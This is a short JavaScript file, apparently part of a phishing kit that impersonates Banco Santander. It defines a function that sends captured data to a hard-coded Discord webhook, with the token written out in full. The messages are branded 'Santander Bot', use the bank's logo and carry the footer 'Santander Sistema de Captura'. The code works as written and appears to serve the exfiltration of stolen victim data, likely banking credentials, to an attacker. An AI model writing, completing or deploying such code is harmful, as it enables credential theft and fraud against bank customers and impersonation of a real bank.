// URL del Webhook de Discord
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1548050196997472317/WZVEGympRVMrhC-SInUbaCt3pYjGfF3xmJ1H3yiSud082mX8-iOmvf46HgYrU-vzZF4m';

// Función para enviar datos a Discord
async function sendToDiscord(title, data, includeFooter = true) {
    const embed = {
        title: title,
        color: 14813568,
        fields: [],
        timestamp: new Date().toISOString()
    };

    if (includeFooter) {
        embed.footer = {
            text: 'Santander Sistema de Captura'
        };
    }

    for (const [key, value] of Object.entries(data)) {
        if (value !== null && value !== undefined && value !== '') {
            embed.fields.push({
                name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
                value: String(value),
                inline: true
            });
        }
    }

    const payload = {
        username: 'Santander Bot',
        avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png',
        embeds: [embed]
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok || response.status === 204) {
            console.log('✓ Datos enviados a Discord');
            return true;
        } else {
            console.error('Error al enviar a Discord:', response.status);
            return false;
        }
    } catch (error) {
        console.error('Error:', error);
        return false;
    }
}
